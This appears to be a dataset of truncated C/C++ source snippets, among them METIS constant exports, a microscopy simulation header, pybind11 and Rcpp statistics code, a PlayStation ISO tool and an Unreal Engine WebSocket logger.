EXPORT_CONSTANT(m, NOPTIONS);\n\n  EXPORT_CONSTANT(m, OK);\n  EXPORT_CONSTANT(m, ERROR_INPUT);\n  EXPORT_CONSTANT(m, ERROR_MEMORY);\n  EXPORT_CONSTANT(m, ERROR);\n\n  EXPORT_CONSTANT(m, OP_PMETIS);\n  EXPORT_CONSTANT(m, OP_KMETIS);\n  EXPORT_CONSTANT(m, OP_OMETIS);\n\n  EXPORT_CONSTANT(m, OPTION_PTYPE);\n  EXPORT_CONSTANT(m, OPTION_OBJTYPE);\n  EXPORT_CONSTANT(m, OPTION_CTYPE);\n  EXPORT_CONSTANT(m, OPTION_IPTYPE);\n  EXPORT_CONSTANT(m, OPTION_RTYPE);\n  EXPORT_CONSTANT(m, OPTION_DBGLVL);\n  EXPORT_CONSTANT(m, OPTION_NITER);\n  EXPORT_CONSTANT(m, OPTION_NCUTS);\n  EXPORT_CONSTANT(m, OPTION_SEED);\n  EXPORT_CONSTANT(m, OPTION_NO2HOP);\n  EXPORT_CONSTANT(m, OPTION_MINCONN);\n  EXPORT_CONSTANT(m, OPTION_CONTIG);\n  EXPORT_CONSTANT(m, OPTION_COMPRESS);\n  EXPORT_CONSTANT(m, OPTION_CCORDER);\n  EXPORT_CONSTANT(m, OPTION_PFACTOR);\n  EXPORT_CONSTANT(m, OPTION_NSEPS);\n  EXPORT_CONSTANT(m, OPTION_UFACTOR);\n  EXPORT_CONSTANT(m, OPTION_NUMBERING);\n\n  EXPORT_CONSTANT(m, PTYPE_RB);\n  EXPORT_CONSTANT(m, PTYPE_KWAY);\n\n  EXPORT_CONSTANT(m, GTYPE_DUAL);\n  EXPORT_CONSTANT(m, GTYPE_NODAL);\n\n  EXPORT_CONSTANT(m, CTYPE_RM);\n  EXPORT_CONSTANT(m, CTYPE_SHEM);\n\n  EXPORT_CONSTANT(m, IPTYPE_GROW);\n  EXPORT_CONSTANT(m, IPTYPE_RANDOM);\n  EXPORT_CONSTANT(m, IPTYPE_EDGE);\n  EXPORT_CONSTANT(m, IPTYPE_NODE);\n  EXPORT_CONSTANT(m, IPTYPE_METISRB);\n\n  EXPORT_CONSTANT(m, RTYPE_FM);\n  EXPORT_CONSTANT(m, RTYPE_GREEDY);\n  EXPORT_CONSTANT(m, RTYPE_SEP2SIDED);\n  EXPORT_CONSTANT(m, RTYPE_SEP1SIDED);\n\n  EXPORT_CONSTANT(m, DBG_INFO);\n  EXPORT_CONSTANT(m, DBG_TIME);\n  EXPORT_CONSTANT(m, DBG_COARSEN);\n  EXPORT_CONSTANT(m, DBG_REFINE);\n",
    "/*\r\n      *** mulslice.cpp ***\r\n\r\n    WARNING: this program has been superceeded and should not be used\r\n    for future application. It is minimally maintainened, not significantly\r\n    updated and may be discontinued at any time (30-oct-2012).\r\n\r\n------------------------------------------------------------------------\r\nCopyright 1998-2019 Earl J. Kirkland\r\n\r\nThis program is free software: you can redistribute it and/or modify\r\n    it under the terms of the GNU General Public License as published by\r\n    the Free Software Foundation, either version 3 of the License, or\r\n    (at your option) any later version.\r\n\r\n    This program is distributed in the hope that it will be useful,\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n    GNU General Public License for more details.\r\n\r\n    You should have received a copy of the GNU General Public License\r\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\r\n\r\n---------------------- NO WARRANTY ------------------\r\nTHIS PROGRAM IS PROVIDED AS-IS WITH ABSOLUTELY NO WARRANTY\r\nOR GUARANTEE OF ANY KIND, EITHER EXPRESSED OR IMPLIED,\r\nINCLUDING BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\r\nMERCHANABILITY AND FITNESS FOR A PARTICULAR PURPOSE.\r\nIN NO EVENT SHALL THE AUTHOR BE LIABLE\r\nFOR DAMAGES RESULTING FROM THE USE OR INABILITY TO USE THIS\r\nPROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA\r\nBEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR\r\nTHIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH\r\nANY OTHER PROGRAM). \r\n\r\n------------------------------------------------------------------------\r\n\r\n  mulslic takes one argument that is the number of threads to use in\r\n  FFTW.  If no argument is prsent then it defaults to NTHREADS_FFTW=4.\r\n\r\n  ANSI C++ and TIFF version\r\n  this version uses FFTW 3 (usually 2x to 3x faster)\r\n\r\n  FFTW choses an optimum form of the FFT at run time so there\r\n  is some variation in execution speed depending on what else \r\n  the CPU is doing during this planning stage\r\n\r\n  see:   www.fftw.org\r\n\r\n  on Windows, file libfftw3f-3.dll must be in the PATH\r\n\r\n  on Linux build as:\r\n  g++ -O -fopenmp -o mulslice mulslice.cpp slicelib.o \r\n                       floatTIFF.o cfpix.o -lfftw3f_threads -lfftw3f\r\n\r\n  rewritten in C 26-july-1995 E. Kirkland\r\n  in working form 5-Oct-1995 ejk\r\n  switch to TIFF file format 5-may-1996 ejk\r\n  remove slice expansion (i.e. put in atompot) 4-aug-1996 ejk\r\n  add dx,dy to output parameters 19-feb-1997 ejk\r\n  remove commas from input formats 11-july-1997 ejk\r\n  fixed small problem with anti-aliasing 5-jan-1998 ejk\r\n  added astigmatism in pc mode and inc. beam tilt 28-jan-1998 ejk\r\n  fixed format of error message 16-feb-1998 ejk\r\n  update memory allocation routines 13-nov-1999 ejk\r\n  change void main() to int main() for better portability\r\n         22-jan-2000 ejk\r\n  change data type of nxl,nyl to long32 for compatibility with new\r\n      tiffsubs.c  17-jul-2007 ejk\r\n  convert to GPL 3-jul-2008 ejk\r\n  convert to FFTW 20-mar-2010 ejk\r\n  get return value of scanf() to remove warnings from gcc 4.4\r\n     and convert to 4 char TAB size formatting 21-mar-2010 ejk\r\n  add multithread option for FFTW 28-mar-2010 ejk\r\n  add eleapsed time clock (for multithreading) 16-apr-2010 ejk\r\n  convert to C++ and floatTIFF.cpp  18-mar-2012 to 15-apr-2012 ejk\r\n  convert to cfpix/fftw class from raw fftw 14-oct-2012 to 30-oct-2012 ejk\r\n  convert malloc1D() etc to vector<> 28-jun-2016 ejk\r\n  convert to streams and strings 2,5-aug-2017 ejk\r\n  remove malloc2D() 6-aug-2017 ejk\r\n  fix format of one info output 4-may-2018 ejk\r\n  move propagate() to here so slicelib does not depend on\r\n       cfpix+fftw 30-jul-2019 ejk\r\n  fix small typo's in user questions, and \r\n       add Cs5 to partial coherence mode 3-aug-2019 ejk\r\n\r\n    PIX   = final pix for partial coherence mode\r\n    WAVE  = current specimen transmitted wavefunction\r\n    TRANS = single slice transmission function\r\n    PROPX,PROPY  = propagator function factored as two 1D arrays\r\n    TEMP  = scratch array\r\n\r\n  This program calls  subroutines from slicelib.cpp,\r\n    floatTIFF.cpp\r\n\r\n  ax,by   = unit cell size in x,y\r\n  BW      = Antialiasing bandwidth limit factor\r\n  acmin   = minimum illumination angle\r\n  acmax   = maximum illumination angle\r\n  Cs3,Cs5 = 3rd, 5th order spherical aberration coefficient\r\n  DF0     = defocus (mean value)\r\n  SIGMAF  = defocus spread (standard deviation)\r\n  DFDELT  = sampling interval for defocus integration\r\n  \r\n  this file is formatted for a TAB size of 4 characters \r\n  \r\n*/\r\n\r\n#include <stdio.h>  /* ANSI C libraries */\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <math.h>\r\n#include <time.h>\r\n\r\n#include <string>\r\n#include <iostream>  //  C++ stream IO\r\n#include <sstream>   // string streams\r\n#include <fstream>\r\n#include <iomanip>   //  to format the output\r\n#include <vector>    // STD vector class\r\n\r\nusing namespace std;\r\n\r\n#include \"cfpix.hpp",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: okarejok <okarejok@student.hive.fi>        +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/07/23 16:39:15 by okarejok          #+#    #+#             */\n/*   Updated: 2024/07/23 16:39:16 by okarejok         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <iostream>\n#include <string>\n\nint main() {\n\tstd::string str = \"HI THIS IS BRAIN\";\n\tstd::string *stringPTR = &str;\n\tstd::string &stringREF = str;\n\n\tstd::cout << \"Memory address of the string variable: \" << &str << std::endl;\n\tstd::cout << \"Memory address held by stringPTR: \" << stringPTR << std::endl;\n\tstd::cout << \"Memory address held by stringREF: \" << &stringREF << std::endl;\n\n\tstd::cout << \"Value of the string variable: \" << str << std::endl;\n\tstd::cout << \"Value pointed to by stringPTR: \" << *stringPTR << std::endl;\n\tstd::cout << \"Value pointed to by stringREF: \" << stringREF << std::endl;\n}\n",
    "#include \"matern_cov.h\"\n#include <Eigen/Dense>\n#include <cmath>\n#include <iostream>\n#include <unsupported/Eigen/MatrixFunctions> // For advanced matrix operations\n#include <gsl/gsl_sf_bessel.h>               // GSL library for special functions (e.g., Bessel)\n#include <omp.h>\n\n#ifndef M_PI\n#define M_PI 3.14159265358979323846  // Pi constant to a high precision\n#endif\n\n// Function to compute the Matern covariance matrix\nEigen::MatrixXd matern_cov_spat(double sigmasq, double range_, double v, const Eigen::MatrixXd& input_coords) {\n    int n = input_coords.rows();\n    Eigen::MatrixXd cov_matrix(n, n);\n\n\t#pragma omp parallel for\n    // Calculate pairwise distances\n    for (int i = 0; i < n; ++i) {\n        for (int j = i; j < n; ++j) {\n            double dist = (input_coords.row(i) - input_coords.row(j)).norm();\n            if (dist == 0) {\n                cov_matrix(i, j) = sigmasq;\n            }\n            else {\n                // Mat?rn covariance formula using Bessel function\n                double factor = sigmasq * std::pow(2, 1 - v) / tgamma(v);\n                double cov = factor * std::pow(dist / range_, v) * gsl_sf_bessel_Knu(v, dist / range_);\n                cov_matrix(i, j) = cov;\n                cov_matrix(j, i) = cov;  // Symmetric matrix\n            }\n        }\n    }\n\n    return cov_matrix;\n}\n\n// Function to calculate the negative log-likelihood\ndouble neg_log_likelihood_nugget(const Eigen::MatrixXd& input_coords, const Eigen::VectorXd& y, double params) {\n    // Compute covariance matrix\n    Eigen::MatrixXd cov_matrix = matern_cov_spat(1.0, 2.0, 0.5, input_coords);\n\n    // Add a jitter term (nugget) for numerical stability\n    cov_matrix += Eigen::MatrixXd::Identity(cov_matrix.rows(), cov_matrix.cols()) * params;\n\n    // Cholesky decomposition\n    Eigen::LLT<Eigen::MatrixXd> llt(cov_matrix);\n    Eigen::MatrixXd L = llt.matrixL();\n\n    // Log determinant\n    double log_det = 2 * L.diagonal().array().log().sum();\n\n    // Calculate beta\n    Eigen::VectorXd beta = (input_coords.transpose() * llt.solve(input_coords)).inverse()\n        * input_coords.transpose() * llt.solve(y);\n    // Mean\n    Eigen::VectorXd mu = input_coords * beta;\n    Eigen::VectorXd y_mu = y - mu;\n\n    Eigen::VectorXd alpha = L.triangularView<Eigen::Lower>().solve(y_mu);\n    double quad_form = alpha.transpose() * alpha;\n\n    // Negative log-likelihood\n    // int n = y.size();\n    int n = static_cast<int>(input_coords.rows());   //  Added explicit type conversions using static_cast<int>\n\n    double neg_log_lik = 0.5 * (n * std::log(2 * M_PI) + log_det + quad_form);\n\n    return neg_log_lik;\n}",
    "//cppimport\n/* my_extension.cpp */\n#include <pybind11/pybind11.h>\n#include <pybind11/numpy.h>\n#include <cmath>\n#include <iostream>\n\nusing namespace std;\nnamespace py=pybind11;\n\nvoid hello_world(int x) {\n    std::cout << \"Hello world! Your number is \" << x << std::endl;\n}\n\nvoid print_double(double x) {\n    std::cout << \"The double you entered is \" << x << std::endl;\n}\n\nuint64_t greet_and_return5(std::string name) {\n    std::cout << \"Howdy, \" << name << std::endl;\n    return 5;\n}\n\ndouble f_norm(py::array_t<double> mat_py) {\n    py::buffer_info info = mat_py.request();\n    double* ptr = static_cast<double*>(info.ptr);\n    uint64_t num_elements = info.shape[0] * info.shape[1];\n\n    double sq_fnorm = 0.0;\n    for(uint64_t i = 0; i < num_elements; i++) {\n        sq_fnorm += ptr[i] * ptr[i];\n    }\n    return sqrt(sq_fnorm);\n}\n\nvoid add3(py::array_t<double> mat_py) {\n    py::buffer_info info = mat_py.request();\n    double* ptr = static_cast<double*>(info.ptr);\n    uint64_t num_elements = info.shape[0] * info.shape[1];\n\n    for(uint64_t i = 0; i < num_elements; i++) {\n        ptr[i] += 3.0;\n    }\n}\n\npy::array_t<double> add3_returncopy(py::array_t<double> mat_py) {\n    py::buffer_info info_in = mat_py.request();\n    double* ptr_in = static_cast<double*>(info_in.ptr);\n    uint64_t num_elements = info_in.shape[0] * info_in.shape[1];\n\n    auto result = py::array_t<double>(info_in.shape);\n    py::buffer_info info_out = result.request();\n    double* ptr_out = static_cast<double*>(info_out.ptr);\n\n    for(int i = 0; i < num_elements; i++) {\n        ptr_out[i] = ptr_in[i] + 3.0;\n    }\n    return result;\n}\n\nPYBIND11_MODULE(my_extension, m) {\n    m.def(\"hello_world\", &hello_world);\n    m.def(\"print_double\", &print_double);\n    m.def(\"greet_and_return5\", &greet_and_return5);\n    m.def(\"f_norm\", &f_norm);\n    m.def(\"add3\", &add3);\n    m.def(\"add3_returncopy\", &add3_returncopy);\n}\n/*\n<%\nsetup_pybind11(cfg)\n%>\n*/",
    "/*\n*\n*\tMegan Grass\n*\tOctober 13, 2024\n*\n*/\n\n#include \"main.h\"\n\nstatic bool DragAndDrop(StrVecW Files)\n{\n    Standard_String Str;\n\n    Standard_FileSystem FS;\n\n    for (std::size_t i = 0; i < Files.size(); i++)\n    {\n        StringW FileExtension = FS.GetFileExtension(Files[i]).wstring();\n\n        Str.ToUpper(FileExtension);\n\n        if (FileExtension == L\".ISO\" || FileExtension == L\".BIN\")\n        {\n            DumpISO->Filename = Files[i];\n            DumpISO->b_CreateXml = true;\n            DumpISO->OutputPath = Window->GetDirectory(DumpISO->Filename);\n            DumpISO->OutputPath += \"\\\\\" + DumpISO->Filename.stem().string();\n            DumpISO->XmlFilename = DumpISO->OutputPath / DumpISO->Filename.stem().string() += \".xml\";\n\n            SendMessage(Window->Get(), WM_COMMAND, IDM_DUMPSXISO, 0);\n            SetDlgItemText(DumpISO->hWnd, IDC_DUMPSXISO_FILE, Files[i].c_str());\n            SetDlgItemText(DumpISO->hWnd, IDC_DUMPSXISO_OUTPUT, DumpISO->OutputPath.c_str());\n            SetDlgItemText(DumpISO->hWnd, IDC_DUMPSXISO_XML_FILE, DumpISO->XmlFilename.c_str());\n            SendMessage(DumpISO->hWnd, WM_COMMAND, IDC_DUMPSXISO_DUMP, 0);\n        }\n\n        if (FileExtension == L\".XML\")\n        {\n            MakeISO->Filename = Files[i];\n            MakeISO->b_Overwrite = true;\n            MakeISO->b_OverrideImageName = true;\n            MakeISO->b_OverrideCueName = true;\n            MakeISO->b_OverrideVolumeLabel = false;\n            MakeISO->b_GenLBA = false;\n            MakeISO->b_GenHeader = false;\n            MakeISO->b_GenFilecode = false;\n            MakeISO->b_GenRE1LBA = false;\n            MakeISO->b_GenRE2LBA = false;\n            MakeISO->b_GenRETEXT = false;\n            MakeISO->b_GenNoISO = false;\n\n            MakeISO->BinFilename = Window->GetDirectory(MakeISO->Filename) / MakeISO->Filename.stem().string() += \".bin\";\n            MakeISO->CueFilename = Window->GetDirectory(MakeISO->Filename) / MakeISO->Filename.stem().string() += \".cue\";\n\n            SendMessage(Window->Get(), WM_COMMAND, IDM_MKPSXISO, 0);\n            SetDlgItemText(MakeISO->hWnd, IDC_MKPSXISO_FILE, MakeISO->Filename.c_str());\n            SetDlgItemText(MakeISO->hWnd, IDC_MKPSXISO_IMAGE, MakeISO->BinFilename.c_str());\n            SetDlgItemText(MakeISO->hWnd, IDC_MKPSXISO_CUE, MakeISO->CueFilename.c_str());\n            SendMessage(MakeISO->hWnd, WM_COMMAND, IDC_MKPSXISO_MAKE, 0);\n        }\n    }\n\n    Window->ClearDroppedFiles();\n\n    return true;\n}\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)\n{\n    Window->PresetStyle(WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX);\n    Window->PresetStyleEx(WS_EX_ACCEPTFILES | WS_EX_APPWINDOW);\n\tWindow->SetCaptionName(hInstance, IDS_APP_TITLE);\n    Window->PresetClassName(hInstance, IDR_WINDOW);\n    Window->SetIcon(hInstance, IDI_WINDOW);\n    Window->SetIconSmall(hInstance, IDI_WINDOW);\n    Window->SetMenu(hInstance, IDR_WINDOW);\n\tWindow->SetAcceleratorTable(hInstance, IDR_WINDOW);\n    Window->SetColor(0, 128, 255);\n    Window->SetStatusBar(3);\n    Window->Create(1920, 1080, hInstance, nCmdShow, WndProc, WindowOptions::StatusBar);\n    Window->Status(0, \"%ws\", VER_INTERNAL_NAME_STR);\n    Window->Status(1, \"v%ws\", VER_PRODUCT_VERSION_STR);\n    Window->Status(2, \"Status: Mode Not Set\\0\");\n    Window->SetTimer(30);\n\n    Splash->hWnd = nullptr;\n\n    DumpISO->hWnd = nullptr;\n    DumpISO->b_CreateXml = true;\n    DumpISO->b_SortByDir = false;\n    DumpISO->Encoding = AudioEncoding::WAVE;\n    DumpISO->b_PathTable = false;\n\n    MakeISO->hWnd = nullptr;\n    MakeISO->b_Overwrite = true;\n    MakeISO->b_OverrideImageName = false;\n    MakeISO->b_OverrideCueName = false;\n    MakeISO->b_OverrideVolumeLabel = false;\n    MakeISO->b_GenLBA = false;\n    MakeISO->b_GenHeader = false;\n    MakeISO->b_GenFilecode = false;\n    MakeISO->b_GenRE1LBA = false;\n    MakeISO->b_GenRE2LBA = false;\n    MakeISO->b_GenRETEXT = false;\n    MakeISO->b_GenNoISO = false;\n    MakeISO->b_GenNoCDXA = false;\n    MakeISO->b_RebuildXML = false;\n\n    CreateDialog(Window->GetInstance(), MAKEINTRESOURCE(IDD_SPLASH), Window->Get(), (DLGPROC)SplashProc);\n\n    HWND hButton = GetDlgItem(Splash->hWnd, IDC_SPLASH_DUMP_ISO);\n    HICON hIcon = (HICON)LoadImage(hInstance, MAKEINTRESOURCE(IDI_SPLASH_DUMP_ISO), IMAGE_ICON, 0, 0, LR_DEFAULTCOLOR);\n    SendMessage(hButton, BM_SETIMAGE, IMAGE_ICON, (LPARAM)hIcon);\n\n    hButton = GetDlgItem(Splash->hWnd, IDC_SPLASH_MAKE_ISO);\n    hIcon = (HICON)LoadImage(hInstance, MAKEINTRESOURCE(IDI_SPLASH_MAKE_ISO), IMAGE_ICON, 0, 0, LR_DEFAULTCOLOR);\n    SendMessage(hButton, BM_SETIMAGE, IMAGE_ICON, (LPARAM)hIcon);\n\n    Window->AddChildWindow(Splash->hWnd, true);\n\n    HACCEL hAccTable = Window->GetAcceleratorTable();\n\n    MSG msg{};\n    msg.message = NULL;\n    msg.hwnd = Window->Get();\n    while (msg.message != WM_QUIT)\n    {\n        if (TranslateAccelerator(msg.hwnd, hAccTable, &msg))\n        {\n            TranslateMessage(&msg);\n            Dispat",
    "#include \"utilities.h\"\n#include \"survival_analysis.h\"\n#include \"logistic_regression.h\"\n\nusing namespace Rcpp;\n\n\nList gest(int n2, int q, int p2, int nids2, \n          IntegerVector idx2, IntegerVector stratumn3, \n          IntegerVector osn3, NumericVector os_timen3, \n          NumericVector censor_timen3,  \n          IntegerVector swtrtn3, NumericVector swtrt_timen3, \n          IntegerVector idn2, IntegerVector y, \n          StringVector covariates_lgs, NumericMatrix zn_lgs2, \n          bool firth, bool flic, bool recensor, \n          double alpha, std::string ties, double psi) {\n  \n  int i, j; \n  double a = exp(psi);\n  \n  // counterfactual survival times and event indicators\n  NumericVector t_star(nids2);\n  IntegerVector d_star(nids2);\n  for (i=0; i<nids2; i++) {\n    double u_star, c_star;\n    if (swtrtn3[i] == 1) {\n      u_star = swtrt_timen3[i] + (os_timen3[i] - swtrt_timen3[i])*a;\n    } else {\n      u_star = os_timen3[i];\n    }\n    \n    if (recensor) {\n      c_star = censor_timen3[i]*std::min(1.0, a);\n      t_star[i] = std::min(u_star, c_star);\n      d_star[i] = c_star < u_star ? 0 : osn3[i];\n    } else {\n      t_star[i] = u_star;\n      d_star[i] = osn3[i];\n    }\n  }\n  \n  // martingale residuals from the null model\n  DataFrame data1 = DataFrame::create(\n    Named(\"t_star\") = t_star,\n    Named(\"d_star\") = d_star,\n    Named(\"stratum\") = stratumn3\n  );\n  \n  List fit1 = phregcpp(\n    data1, \"\", \"stratum\", \"t_star\", \"\", \"d_star\",\n    \"\", \"\", \"\", \"\", ties, 0, 0, 1, 0, 0, alpha);\n  \n  // replicate counterfactual residuals within subjects\n  NumericVector resid3 = fit1[\"residuals\"];\n  NumericVector resid(n2);\n  for (i=0; i<nids2; i++) {\n    for (j=idx2[i]; j<idx2[i+1]; j++) {\n      resid[j] = resid3[i];\n    }\n  }\n  \n  // logistic regression switching model\n  DataFrame data2 = DataFrame::create(\n    Named(\"cross\") = y,\n    Named(\"counterfactual\") = resid,\n    Named(\"id\") = idn2);\n  \n  for (int j=0; j<q+p2; j++) {\n    String zj = covariates_lgs[j+1];\n    NumericVector u = zn_lgs2(_,j);\n    data2.push_back(u, zj);\n  }\n  \n  List fit2 = logisregcpp(\n    data2, \"\", \"cross\", covariates_lgs, \"\", \n    \"\", \"\", \"id\", 1, firth, flic, 0, alpha);\n  \n  DataFrame parest = DataFrame(fit2[\"parest\"]);\n  NumericVector z = parest[\"z\"];\n  double z_counterfactual = z[1];\n  \n  List out = List::create(\n    Named(\"data_nullcox\") = data1,\n    Named(\"fit_nullcox\") = fit1,\n    Named(\"data_logis\") = data2,\n    Named(\"fit_logis\") = fit2,\n    Named(\"z_counterfactual\") = z_counterfactual);\n  \n  return out;\n};\n\n\n// [[Rcpp::export]]\nList tsegestcpp(\n    const DataFrame data,\n    const std::string id = \"id\",\n    const StringVector& stratum = \"\",\n    const std::string tstart = \"tstart\",\n    const std::string tstop = \"tstop\",\n    const std::string event = \"event\",\n    const std::string treat = \"treat\",\n    const std::string censor_time = \"censor_time\",\n    const std::string pd = \"pd\",\n    const std::string pd_time = \"pd_time\",\n    const std::string swtrt = \"swtrt\",\n    const std::string swtrt_time = \"swtrt_time\",\n    const std::string swtrt_time_upper = \"\",\n    const StringVector& base_cov = \"\",\n    const StringVector& conf_cov = \"\",\n    const double low_psi = -3,\n    const double hi_psi = 3,\n    const int n_eval_z = 100,\n    const bool strata_main_effect_only = 1,\n    const bool firth = 0,\n    const bool flic = 0,\n    const bool recensor = 1,\n    const bool admin_recensor_only = 1,\n    const bool swtrt_control_only = 1,\n    const double alpha = 0.05,\n    const std::string ties = \"efron\",\n    const double tol = 1.0e-6,\n    const bool boot = 1,\n    const int n_boot = 1000,\n    const int seed = NA_INTEGER) {\n  \n  int i, j, k, n = data.nrow();\n  \n  int p = static_cast<int>(base_cov.size());\n  if (p == 1 && (base_cov[0] == \"\" || base_cov[0] == \"none\")) p = 0;\n  \n  int p2 = static_cast<int>(conf_cov.size());\n  if (p2 == 1 && (conf_cov[0] == \"\" || conf_cov[0] == \"none\")) p2 = 0;\n  \n  bool has_id = hasVariable(data, id);\n  bool has_tstart = hasVariable(data, tstart);\n  bool has_tstop = hasVariable(data, tstop);\n  bool has_event = hasVariable(data, event);\n  bool has_treat = hasVariable(data, treat);\n  bool has_censor_time = hasVariable(data, censor_time);\n  bool has_pd = hasVariable(data, pd);\n  bool has_pd_time = hasVariable(data, pd_time);\n  bool has_swtrt = hasVariable(data, swtrt);\n  bool has_swtrt_time = hasVariable(data, swtrt_time);\n  bool has_swtrt_time_upper = hasVariable(data, swtrt_time_upper);\n  \n  // create the numeric id variable\n  if (!has_id) stop(\"data must contain the id variable\");\n  IntegerVector idn(n);\n  IntegerVector idwi;\n  NumericVector idwn;\n  StringVector idwc;\n  if (TYPEOF(data[id]) == INTSXP) {\n    IntegerVector idv = data[id];\n    idwi = unique(idv);\n    idwi.sort();\n    idn = match(idv, idwi);\n  } else if (TYPEOF(data[id]) == REALSXP) {\n    NumericVector idv = data[id];\n    idwn = unique(idv);\n    idwn.sort();\n    idn = match(idv, idwn);\n  } else if (TYPEOF(data[id]) == STRSXP) {\n    StringVector idv = data[id];\n    idwc = u",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"LoggerSystem.h\"\n#include \"LoggerSetting.h\"\n#include \"WebSocketsModule.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n\nbool ULoggerSystem::ShouldCreateSubsystem(UObject* Outer) const\n{\n\treturn Super::ShouldCreateSubsystem(Outer);\n}\n\nvoid ULoggerSystem::Initialize(FSubsystemCollectionBase& Collection)\n{\n\tSuper::Initialize(Collection);\n}\n\nvoid ULoggerSystem::Deinitialize()\n{\n\tSuper::Deinitialize();\n\n\tif (LoggerWS.IsValid())\n\t{\n\t\tLoggerWS->Close();\n\t\tLoggerWS = nullptr;\n\t}\n}\n\nvoid ULoggerSystem::MakeLoggerSetting(const FLoggerWebSocketSetting Setting)\n{\n\tconst FString WS_URL = FString::Printf(TEXT(\"ws://%s:%s\"), *Setting.WebSocketURL, *Setting.Port);\n\tFWebSocketsModule& WebSocketModule = FWebSocketsModule::Get();\n\t\n\tLoggerWS = WebSocketModule.CreateWebSocket(WS_URL);\n\n\tif (LoggerWS.IsValid())\n\t{\n\t\tLoggerWS->OnConnected().AddUObject(this, &ULoggerSystem::OnConnected);\n\t\tLoggerWS->OnMessage().AddUObject(this, &ULoggerSystem::OnMessage);\n\t\tLoggerWS->OnConnectionError().AddUObject(this, &ULoggerSystem::OnConnectionError);\n\t\tLoggerWS->OnClosed().AddUObject(this, &ThisClass::OnClosed);\n\n\t\tLoggerWS->Connect();\n\t}\n}\n\nvoid ULoggerSystem::SetGlobalLogSetting(const bool UseGlobalLogSetting, const ELogSetting Global_LogSetting)\n{\n\tIsUseGlobalLogSetting = UseGlobalLogSetting;\t\n\tG_LogSetting = Global_LogSetting;\n}\n\nvoid ULoggerSystem::OnConnected()\n{\n\tUE_LOG(Logger, Log, TEXT(\"WebSocket connected!\"));\n}\n\nvoid ULoggerSystem::OnMessage(const FString& Message)\n{\n\tUE_LOG(Logger, Log, TEXT(\"Received message: %s\"), *Message);\n}\n\nvoid ULoggerSystem::OnConnectionError(const FString& Error)\n{\n\tUE_LOG(Logger, Error, TEXT(\"Connection error: %s\"), *Error);\n}\n\nvoid ULoggerSystem::OnClosed(int32 StatusCode, const FString& Reason, bool bWasClean)\n{\n\tUE_LOG(Logger, Log, TEXT(\"WebSocket closed. Status code: %d. Reason: %s. Clean: %s\"), StatusCode, *Reason, bWasClean ? TEXT(\"true\") : TEXT(\"false\"));\n}\n\nvoid ULoggerSystem::SendLog(const UObject* WorldContext, const bool IsUseWorldContextName, const FLoggerSetting& Setting)\n{\n\tif (IsUseGlobalLogSetting)\n\t{\n\t\tswitch (G_LogSetting)\n\t\t{\n\t\tcase ELogSetting::ELS_OnlyLogger:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, false, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_LoggerAndUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, false, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_LoggerAndUEScreen:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, true, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_OnlyUEScreen:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, true, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_OnlyUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, false, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_UEScreenAndUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, true, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_All:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, true, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_Null:\n\t\t\tbreak;\t\n\t\t}\n\t}\n\telse\n\t{\n\t\tswitch (Setting.LogSetting)\n\t\t{\n\t\tcase ELogSetting::ELS_OnlyLogger:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, false, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_LoggerAndUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, false, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_LoggerAndUEScreen:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, true, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_OnlyUEScreen:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, true, false);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_OnlyUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, false, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_UEScreenAndUELog:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, false, true, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_All:\n\t\t\tPrintUE_Log(WorldContext, IsUseWorldContextName, Setting, true, true, true);\n\t\t\tbreak;\n\t\tcase ELogSetting::ELS_Null:\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid ULoggerSystem::CloseLogger() const\n{\n\tif (LoggerWS.IsValid())\n\t{\n\t\tLoggerWS->Close();\n\t}\n}\n\nint32 ULoggerSystem::GetLogLevel(const 